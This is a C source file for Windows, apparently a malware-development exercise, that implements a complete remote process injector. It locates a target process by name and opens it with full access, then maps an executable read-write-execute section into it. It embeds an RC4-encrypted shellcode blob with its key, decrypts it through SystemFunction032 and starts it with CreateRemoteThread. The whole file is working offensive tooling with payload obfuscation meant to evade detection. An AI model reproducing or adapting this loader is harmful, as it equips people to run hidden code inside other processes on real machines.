#include <stdio.h>
#include <Windows.h>
#pragma comment (lib, "OneCore.lib")
#include <TlHelp32.h>
#include "./deobfuscation.h"


BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	HANDLE			hSnapShot = NULL;
	PROCESSENTRY32	Proc = {
					.dwSize = sizeof(PROCESSENTRY32)
	};

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("\n\t[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {

			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// converting each charachter in Proc.szExeFile to a lower case character and saving it
			// in LowerName to do the *wcscmp* call later ...

			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// compare the enumerated process path with what is passed, if equal ..
		if (wcscmp(LowerName, szProcessName) == 0) {
			// we save the process id 
			*dwProcessId = Proc.th32ProcessID;
			// we open a process handle and return
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("\n\t[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

		// Retrieves information about the next process recorded the snapshot.
	} while (Process32Next(hSnapShot, &Proc));
	// while we can still have a valid output ftom Process32Net, continue looping


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}



BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress, BYTE pRc4Key, PVOID* pLocalMapAddress) {

	BOOL        bSTATE = TRUE;
	HANDLE      hFile = NULL;
	PVOID       pMapLocalAddress = NULL,
		pMapRemoteAddress = NULL;

	// Create a file mapping handle with RWX memory permissions
	// This does not allocate RWX view of file unless it is specified in the subsequent MapViewOfFile call  
	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Maps the view of the payload to the memory 
	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (pMapLocalAddress == NULL) {
		printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	printf("[+] Local Mapping Address: 0x%p \n", pMapLocalAddress);

	// Copying the payload to the mapped memory
	memcpy(pMapLocalAddress, pPayload, sPayloadSize);

	// Maps the payload to a new remote buffer in the target process
	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
	if (pMapRemoteAddress == NULL) {
		printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);


_EndOfFunction:
	*ppAddress = pMapRemoteAddress;
	*pLocalMapAddress = pMapLocalAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}

unsigned char Rc4CipherText[] = {
		0x60, 0x09, 0x97, 0xE9, 0x97, 0xFC, 0xD0, 0x74, 0x0F, 0xE4, 0xE1, 0xEA, 0xC2, 0xA5, 0xA5, 0xEE,
		0x84, 0xA4, 0x9E, 0x66, 0xCD, 0x22, 0x02, 0xFA, 0x3B, 0x39, 0x68, 0x44, 0x14, 0xE7, 0xFF, 0xA4,
		0xF1, 0xD5, 0xF4, 0xB7, 0x42, 0x32, 0x16, 0xD1, 0x3D, 0x31, 0xBC, 0x0B, 0x04, 0x63, 0x30, 0xF9,
		0x3D, 0xE6, 0x44, 0x30, 0x3D, 0xAB, 0x2D, 0x97, 0xE0, 0x77, 0xA3, 0xFA, 0x1B, 0xD8, 0x00, 0x8A,
		0xEC, 0x26, 0x86, 0x25, 0xDA, 0x48, 0x8D, 0xEF, 0xD1, 0xFC, 0xE8, 0x1A, 0xAA, 0xB1, 0x79, 0xBB,
		0xDB, 0x56, 0x5A, 0x1E, 0x40, 0xDF, 0x77, 0xBA, 0xC5, 0x7E, 0xE4, 0x2E, 0xD7, 0xE9, 0x3C, 0xB3,
		0xBB, 0xF4, 0x10, 0xD4, 0xBF, 0xF0, 0x0B, 0x59, 0x58, 0xF8, 0xBD, 0xA9, 0x50, 0xF3, 0x52, 0x36,
		0xF6, 0xF0, 0xAE, 0x4C, 0x82, 0xF6, 0x8E, 0x7A, 0xC3, 0xCF, 0x06, 0x94, 0xCF, 0x04, 0xED, 0x15,
		0xA0, 0x07, 0xC5, 0xC7, 0x93, 0x22, 0x7C, 0x74, 0x55, 0x3B, 0x08, 0x83, 0x6F, 0xCA, 0xCF, 0x83,
		0x13, 0xD2, 0x53, 0xE1, 0x32, 0x8F, 0x9D, 0xD9, 0x10, 0x59, 0x7B, 0x11, 0xA5, 0x3F, 0xDD, 0x8C,
		0x11, 0x5F, 0xDD, 0x24, 0x2A, 0x00, 0x5C, 0xE3, 0x94, 0xBC, 0x98, 0x4A, 0xF7, 0xD6, 0x47, 0x38,
		0x56, 0x0E, 0x21, 0xC0, 0x58, 0x97, 0x22, 0x58, 0xAF, 0xBC, 0x7A, 0xC0, 0x2E, 0xE2, 0xBC, 0x87,
		0xD8, 0x2B, 0xCC, 0x6C, 0xFD, 0x7E, 0x8C, 0xDB, 0x7E, 0xA0, 0xF2, 0xD9, 0x4E, 0x78, 0xA5, 0xB6,
		0xA6, 0x25, 0xC8, 0x55, 0xB6, 0x7D, 0x82, 0xA1, 0x3E, 0xE9, 0x4C, 0xA7, 0xAE, 0x60, 0xFF, 0x23,
		0x3D, 0xD4, 0x8D, 0x1E, 0x29, 0x94, 0x4C, 0xEB, 0xDA, 0xBC, 0x84, 0xD3, 0x1A, 0xF1, 0x40, 0x15,
		0x5E, 0xEF, 0x36, 0xFC, 0xEE, 0x18, 0xB9, 0xEF, 0xA3, 0x69, 0xC5, 0x55, 0x09, 0xD3, 0x93, 0xE0,
		0x7D, 0x0B, 0x8D, 0x08, 0x6E, 0x30, 0x47, 0xE5, 0x35, 0x07, 0xF7, 0x7E, 0x89, 0xAD, 0xEE, 0x11,
		0xD2, 0xFB, 0x3B, 0x8B };


unsigned char Rc4Key[] = {
		0x0D, 0x8C, 0x65, 0x8B, 0xFB, 0x31, 0x6D, 0xD6, 0x32, 0x88, 0xB3, 0x5A, 0xDD, 0x20, 0x62, 0x2A };

// Set wmain to display 16-bit Windows Unicode Characters
int wmain(int argc, wchar_t* argv[]) {

	HANDLE hProcess = NULL,
		   hThread = NULL;
	PVOID pAddress = NULL;
	DWORD dwProcessId = NULL;
	PVOID MapLocalAddress;

	if (argc < 2) {
		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
		return -1;
	}

	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	printf("[+] DONE \n");
	printf("[+] Found Target Process Pid: %d \n", dwProcessId);


	printf("[i] Injecting Target Process ... \n");
	if (!RemoteMapInject(hProcess, &Rc4CipherText, sizeof(Rc4CipherText), &pAddress, Rc4Key, &MapLocalAddress)) {
		printf("[!] FAILED \n");
		return -1;
	}
	printf("[+] DONE \n");



	/* ===== Decrypting payload ===== */
	//-----------------------------------
	printf("[+] Press <Enter> to decrypt the payload: ");
	getchar();
	printf("[+] Start decrypting ... ");
	//BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize)
	Rc4EncryptionViaSystemFunc032(Rc4Key, &Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText));
	memcpy(MapLocalAddress, Rc4CipherText, sizeof(Rc4CipherText));
	//-----------------------------------


	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();

	hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
	if (hThread == NULL)
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());


	printf("[#] Press <Enter> To Quit ... ");
	UnmapViewOfFile(MapLocalAddress);
	UnmapViewOfFile(pAddress);
	getchar();

	return 0;
}